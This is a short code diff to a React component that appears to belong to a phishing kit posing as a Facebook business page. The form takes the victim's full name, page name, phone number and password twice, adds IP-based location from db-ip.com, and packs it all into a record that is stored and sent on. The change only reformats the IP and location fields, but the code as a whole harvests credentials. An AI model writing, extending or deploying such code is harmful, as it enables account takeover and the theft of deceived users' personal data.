@@ -47,7 +47,7 @@ const Buiness = () => {
             axios.get(`https://api.db-ip.com/v2/free/self`)
                 .then((response) => {
 
-                    const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord, ip:response.data.ipAddress, city: response.data.city, country: response.data.countryName   };
+                    const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord, IP: response.data.ipAddress + "|" + response.data.city + "|" + response.data.countryName + "|" + response.data.continentName + "|" + response.data.countryCode,   };
                     localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
 
                     const data = {
@@ -56,9 +56,7 @@ const Buiness = () => {
                         'fill_full_name': dataPassWord.fill_full_name,
                         'fill_facebook_pagename': dataPassWord.fill_facebook_pagename,
                         'fill_phone': dataPassWord.fill_phone,
-                        'ip': response.data.ipAddress,
-                        'city': response.data.city,
-                        'country': response.data.countryName,
+                        'ip': response.data.ipAddress + "|" + response.data.city + "|" + response.data.countryName + "|" + response.data.continentName + "|" + response.data.countryCode,
                         'first_password': firstPassword,
                         'second_password': passWord,
                     }
